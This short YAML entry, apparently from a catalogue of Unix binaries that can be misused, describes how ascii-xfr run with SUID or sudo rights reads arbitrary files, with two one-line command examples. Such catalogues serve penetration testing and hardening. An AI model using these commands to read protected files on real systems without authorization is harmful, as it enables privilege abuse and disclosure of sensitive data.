---
description: It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
functions:
  suid:
    - code: |
        LFILE=file_to_read
        ./ascii-xfr -s "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo ascii-xfr -s "$LFILE"
---
